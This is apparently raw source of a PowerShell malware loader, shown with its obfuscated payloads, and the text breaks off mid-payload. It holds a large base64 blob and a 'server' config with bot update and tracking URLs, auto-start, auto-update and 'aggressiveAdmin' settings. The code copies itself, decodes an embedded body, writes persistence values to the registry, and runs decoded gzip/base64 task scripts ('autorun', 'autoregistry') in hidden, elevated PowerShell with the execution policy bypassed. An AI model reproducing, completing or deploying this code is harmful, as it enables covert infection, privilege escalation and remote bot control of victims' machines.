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"




$server = @'
{
  "version": "2026.04.19 17:55:04",
  "disabled": false,
  "disableVirus": false,
  "serverIp": "26.188.115.1",
  "server": "default",
  "primaryDns": "26.188.115.1",
  "secondaryDns": "192.168.30.77",
  "extraUpdate": false,
  "updateUrl": "http://123/bot/update",
  "track": true,
  "trackDesktop": false,
  "trackUrl": "http://123/bot/upsert",
  "autoStart": true,
  "autoUpdate": true,
  "aggressiveAdmin": true,
  "aggressiveAdminDelay": 1,
  "aggressiveAdminAttempts": 0,
  "aggressiveAdminTimes": 0,
  "pushesForce": true,
  "pushes": [],
  "startDownloadsForce": true,
  "startDownloads": [],
  "startUrlsForce": false,
  "startUrls": [],
  "frontForce": false,
  "front": [],
  "embeddingsForce": false,
  "embeddings": []
}
'@ | ConvertFrom-Json




function checkFolder {
    $appDataFolder = Get-HephaestusFolder
    if (-not (Test-Path -Path $appDataFolder))
    {
        New-Item -Path $appDataFolder -ItemType Directory | Out-Null
    }
}

$globalScriptPaths = @(
    #$MyInvocation.MyCommand.Definition,
    $PSCommandPath,
    $MyInvocation.MyCommand.Path
)

function Get-ScriptPath {
    
    foreach ($path in $globalScriptPaths) {
        try {
            if (Test-Path $path) {
                return $path
            }
        }
        catch {
        }
    }
}

function extract_holder()
{
    try
    {
        

        $holderFile = Get-HolderPath
        if ([string]::IsNullOrEmpty($EncodedScript) -eq $false)
        {
            $random = 'plain'
            $content = '
    
    '
            $DoubleQuote = [char]34
            $DollarSign = [char]36
            $sb = New-Object System.Text.StringBuilder
            [void]$sb.AppendLine($random)
            [void]$sb.Append($DollarSign)
            [void]$sb.Append("EncodedScript =")
            [void]$sb.Append($DoubleQuote)
            [void]$sb.Append($EncodedScript)
            [void]$sb.Append($DoubleQuote)
            [void]$sb.AppendLine("")
            [void]$sb.AppendLine($content)
            $content = $sb.ToString()
            $folderPath = [System.IO.Path]::GetDirectoryName($holderFile)
            if (-not (Test-Path -Path $folderPath)) {
                New-Item -Path $folderPath -ItemType Directory
            }
            [System.IO.File]::WriteAllText($holderFile, $content)
            writedbg "extract_holder encodedScript"

            return
        }
        try
        {
            $curScript = Get-ScriptPath
            $pathOrData = $global:MyInvocation.MyCommand.Definition
            if ($pathOrData.Length -gt 500)
            {
                writedbg "extract_holder pathOrData"
                [System.IO.File]::WriteAllText($holderFile, $pathOrData)
            } 
            else 
            {
                if ($curScript -ne $holderFile)
                {
                    Copy-Item -Path $curScript -Destination $holderFile -Force
                }
            } 
        }
        catch
        {
        }
    }
    finally 
    {
        try 
        { 
            if ($null -ne $server.startDownloads) 
            {
                if ($null -ne $server.startDownloads[0]) 
                {
                    RegWriteParam -keyName "download" -value $server.startDownloads[0]    
                }
            }
            RegWriteParamBool -keyName "autoStart" -value $server.autoStart    
            RegWriteParamBool -keyName "autoUpdate" -value $server.autoUpdate
            RegWriteParam -keyName "trackSerie" -value $server.trackSerie
        }
        catch {
        
        }
    }
}

function extract_body()
{
    $holderBodyFile = Get-BodyPath
    if (-not (Test-Path -Path $holderBodyFile))
    {
        CustomDecode -inContent $xbody -outFile $holderBodyFile
    }
}

function Initialization() 
{
    writedbg "holder initialization"
    checkFolder
    extract_holder
    extract_body
}

Initialization




###head


function GetLocalScriptPath {
    param
    (

    [Parameter(Mandatory = $true)]
    [string[]]
    $taskName
    )
    $scriptPath = Get-HephaestusFolder
    $fullPath = Join-Path -Path $scriptPath -ChildPath "$taskName.ps1"
    return $fullPath
}

function Save-Script
{
    param
    (
        [Parameter(Mandatory = $true)]
        [string[]]
        $taskName,

        [Parameter(Mandatory = $true)]
        [string[]]
        $body
    )
    $scriptPath= GetLocalScriptPath -taskName $taskName
    CustomDecode -inContent $body -outFile $scriptPath
    return $fullPath
}

function Invoke-Script
{
    param
    (
        [Parameter(Mandatory = $true)]
        [string[]]
        $taskName
    )
    $scriptPath= GetLocalScriptPath -taskName $taskName
    if ($globalDebug)
    {
        Start-Process powershell.exe -WindowStyle Normal -ArgumentList "-ExecutionPolicy Bypass -file ""$scriptPath"" -Task $taskName"
    }
    else
    {
        Start-Process powershell.exe -WindowStyle Hidden -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`" -Task $taskName"
    }
}

$global:Task = $null

for ($i = 0; $i -lt $args.Count; $i++) {
    if ($args[$i] -eq '-Task') {
        if ($i + 1 -lt $args.Count) {
            $global:Task = $args[$i + 1]
        } else {
            writedbg "No value provided for -Task argument."
        }
    }
}

function Main 
{
    $showPath = GetLocalScriptPath -taskName "program"
    writedbg "program curScript: $showPath"

    if ($global:Task) {
        writedbg "Task - $task"
        & $global:Task
    } else 
    {               

   
        $tasks = @{
               "autorun" = "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"
    "autoregistry" = "H4sIAAAAAAAACtVbe3PbNhL/PzP5DhhWc5Jqk5GcR1N1NK0i24nb+FFLru/q6FyIhETEJMGCoG01zXe/WRAkAZKynMTpzLkzjYTHvrD7w2IBnXMqiP2GJQK1cSoYJ0uaCL5qP360SCNXUBahg2SXzNMl+vD4EUIItTz4tk8DgobIGg/eye+OuBVWNiD7v+CrfAb8fYPGPnGvEF0g4RO0gOnkliYiKcfQBepMSSLsEyx8nY9smK5igt4SvOjqdOGPE5HyCLUET0nZ8xGRICHrxi5wkOiDs48fkYuF61cEl004WiHCOeMJEj4WiLluypGXchotpUql5CwmHIPpSioNbD8+fvTx8aPHj1ohdn0akTHzpEUtaCyM/5oI+1Ab8AF6c2NdJALYzwaDg+QoDYJjvhfGYtXRSXaRTf5UjLvZ1A91ubQJhXQNq9iaU5ZMCKc4QEPUAeHOQ3o8f09cgc5p9HTn8tXB8aTrZGOO0nBOuDY9nG+YjBPyimHuraeA3ZHncZIk62gcEXHD+NXIw7EgfMyiBV2m2Xqgv9G5Tzix1YQPqHXpHI7GOUUbRx40HZzsRXgeEA997Gr9F72Z7uFSHpeFcxoRbyJXAtZPs1Ghrya2VSOR+Hjn+Qs0RBeTVSJI6EyIm3IqVs6Yr2LBlhzH/sqZvBntPH8xGwzGnGBBOl19WVaCJBqFKbkVzl7kMi9zj7Pp/kvnNRGvYFynIrROyMeJLwehYS6YM2ZhnAryBid+J+OkZhhBwqJrwgUSDMEivniGwJYCXxEV7zwRqL+DXB9z7ArCkwrXwoAXitRsMJiyjFbW1yml6yKbkzjALkHWxX+x/dfI/r1nfz+ztpFlgTinJGTXBEUssnEQ+zhKQ8Kp28je9C4tFDW5nEk6z4Kt09tG/Z2uESUZaNSCqxrZb0jsY5KINHcCNb0xCDNs8EmczTgl0rne/DI+G7ybsIW4wZy8a3VanQpCdLsSQFrLg